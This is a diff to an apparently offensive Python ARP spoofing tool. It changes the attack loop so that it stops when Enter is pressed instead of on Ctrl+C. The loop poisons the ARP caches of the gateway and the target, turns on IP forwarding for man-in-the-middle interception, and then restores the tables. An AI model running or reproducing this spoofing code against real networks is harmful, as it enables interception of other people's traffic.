@@ -5,6 +5,8 @@ import argparse
 import network
 import time
 import os
+import _thread
+
 
 def parse_arguments():
     parser = argparse.ArgumentParser()
@@ -60,23 +62,34 @@ def arp_spoofing(target):
 
     network_commands.set_ipv4_forwarding(True)
 
-    try:
-        arp_counter = 0
-        while True:
-            spoof(ip_gateway, target, target_mac=mac_gateway)
-            spoof(target, ip_gateway, target_mac=mac_target)
+    keys = []
+    _thread.start_new(input_thread, (keys,))
+    print("[!]", "Press Enter to stop attack!")
 
-            arp_counter += 2
+    arp_counter = 0
 
-            print("\r[+] Send ARP " + str(arp_counter), end=" ", flush=True)
+    while True:
+        spoof(ip_gateway, target, target_mac=mac_gateway)
+        spoof(target, ip_gateway, target_mac=mac_target)
 
-            time.sleep(2)
+        arp_counter += 2
 
-    except KeyboardInterrupt:
-        print("\n[-] Detected CTRL + C ... Resetting ARP tables")
-        network_commands.set_ipv4_forwarding(False)
-        restore(ip_gateway, target)
-        restore(target, ip_gateway)
+        print("\r[+] Send ARP " + str(arp_counter), end=" ", flush=True)
+
+        time.sleep(2)
+
+        if keys:
+            break
+
+    print("\n[-] Detected 'Enter' ... Resetting ARP tables")
+    network_commands.set_ipv4_forwarding(False)
+    restore(ip_gateway, target)
+    restore(target, ip_gateway)
+
+
+def input_thread(L):
+    key = input()
+    L.append(key)
 
 
 def has_sudo_or_admin_rights():
